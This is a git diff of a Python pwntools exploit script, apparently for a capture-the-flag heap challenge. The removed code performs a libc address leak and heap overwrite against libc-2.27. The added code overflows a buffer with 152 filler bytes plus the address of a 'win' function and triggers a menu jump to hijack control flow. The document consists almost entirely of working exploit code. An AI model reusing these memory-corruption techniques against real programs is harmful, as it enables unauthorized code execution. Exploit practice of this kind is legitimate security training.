@@ -15,7 +15,6 @@ ru = lambda p,s: p.recvuntil(s, timeout=to)
 rl = lambda p: p.recvline()
 sla = lambda p,a,b: p.sendlineafter(a, b, timeout=to)
 sl = lambda p,a: p.sendline(a)
-s = lambda p,a: p.send(a)
 
 def start(binary):
 
@@ -34,61 +33,43 @@ def start(binary):
         return process(binary)
 
 def create(p, size, value):
-    ru(p,b"exit\n")
+    ru(p, "[1-5] :")
     sl(p,b"1")
-    ru(p,b"size?")
+    ru(p,b"size :")
     sl(p,b"%i" % size)
-    ru(p,b"str?")
+    ru(p,b"data :")
     sl(p,value)
 
-def edit(p, index, value):
-    ru(p,b"exit\n")
-    sl(p,b"2")
-    ru(p,b"idx?")
-    sl(p,b"%i" % index)
-    ru(p,b"delim?")
-    s(p,value)
-
-    value = b"\xa0" + rl(p).strip()
-
-    log.info(f"Leak {value}")
-    return value
-    
-
 def delete(p, index):
-    ru(p,b"exit\n")
-    sl(p,b"3")
-    ru(p,b"idx?")
-    sl(p,b"%i" % index)
+    ru(p,b"[1-5] :")
+    sl(p,b"2")
 
+def allocate(p):
+    ru(p,b"[1-5] :")
+    sl(p,b"4")
 
-def exploit(p,e,l):
-    create(p, 0x508, b"A" * 0x508)
-    create(p, 0x508, b"B" * 0x508)
-
-    delete(p,0)
-    create(p, 0x508, b"")
-    libc_leak = edit(p, 0, b"\x0a")
-
-    libc_leak = u64(libc_leak.ljust(8,b"\x00"))
-    libc_base = libc_leak - 0x3ebca0
-
-    log.info(f"Found libc leak {hex(libc_leak)}")
-    log.info(f"Resolved libc base {hex(libc_base)}")
+def jump(p, index):
+    ru(p,b"[1-5] :")
+    sl(p,b"5")
+    ru(p,b"or 3)")
+    sl(p,"%i" % index)
 
     
-    create(p, 0x508, b"C" * 0x508)
 
-    edit(p, 0, b"\x11")
+def exploit(p,e):
+    
+    payload = b"A" * 152 + p64(e.sym["win"])
+    create(p, 0x80, payload)
+    allocate(p)
+    jump(p,2)
 
     p.interactive()
-
+    
 
 if __name__=="__main__":
     file = args.BIN
 
     p = start(file)
     e = context.binary = ELF(file)
-    l = ELF("./libc-2.27.so")
 
-    exploit(p,e,l)
+    exploit(p,e)
